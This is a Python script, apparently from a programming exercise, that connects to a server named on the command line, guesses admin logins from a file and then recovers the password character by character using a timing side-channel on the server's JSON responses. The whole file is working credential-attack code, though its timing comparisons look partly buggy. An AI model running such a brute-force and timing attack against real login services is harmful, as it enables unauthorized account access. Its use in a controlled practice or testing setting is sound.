import itertools
import sys
import socket
import string
import json
from datetime import datetime

def brute_force():
    ingredients = string.ascii_uppercase + string.ascii_lowercase + '1234567890'
    product = itertools.product(ingredients, repeat=1)
    for i in product:
        yield i

def login_base():
    # in logins.txt file we have list of admin logins, one of is correct and allow us to connect with the server
    with open('logins.txt', 'r') as logins:
        for login in list(logins):
            yield login.strip()

def connection():
    connection = socket.socket()
    # pobieranie adresu z argumentu podanego przy wywołaniu
    # taking address from argument given during launching .py file through windows cmd
    address = sys.argv[1]
    # pobieranie portu z argumentu
    # taking port number from argument
    port = int(sys.argv[2])
    # connecting with the server
    connection.connect((address, port))
    # response from the server for purpose of the code below
    str_response = {"result": ""}
    for suppose_login in login_base():
        # firstly we check which login is correct to connect the server, password now can be empty
        login_data = {"login": suppose_login, "password": ' '}
        # messages to and from server and sent in json format
        json_login_data = json.dumps(login_data)
        connection.send((json_login_data.encode()))
        # measure time of server respond
        start = datetime.now().microsecond
        response = connection.recv(1024)
        end = datetime.now().microsecond
        # if login is correct we get answer from the server in a very quick time
        difference = end - start
        str_response = json.loads(response.decode())
        # if login was correct we're receiving "Wrong password!" response from server
        if str_response["result"] == "Wrong password!":
            login = suppose_login
            suppose_password = ''
            password = ''
            while(True):
                generator = brute_force()
                for i in generator:
                    # collecting password letter by letter and checking if it's correct
                    suppose_password += i[0]
                    login_data = {"login": login, "password": suppose_password}
                    json_login_data = json.dumps(login_data)
                    connection.send((json_login_data.encode()))
                    start = datetime.now().microsecond
                    response = connection.recv(1024)
                    end = datetime.now().microsecond
                    difference_password = start - end
                    str_response = json.loads(response.decode())
                    # if password is correct we get answer in a very quick time if answer time is longer we know that
                    # password that we've sent is wrong
                    if difference_password > difference:
                        password = suppose_password
                        break
                    # each time we sent a password that we think is correct we get "Wrong password!" answer but
                    # in this implement we depend on respond time from the server
                    elif str_response["result"] == "Wrong password!":
                        suppose_password = password
                        continue
                    elif str_response["result"] == "Connection success!":
                        password = suppose_password
                        print(json.dumps({"login": login, "password": password}))
                        exit(0)
    connection.close()

connection()
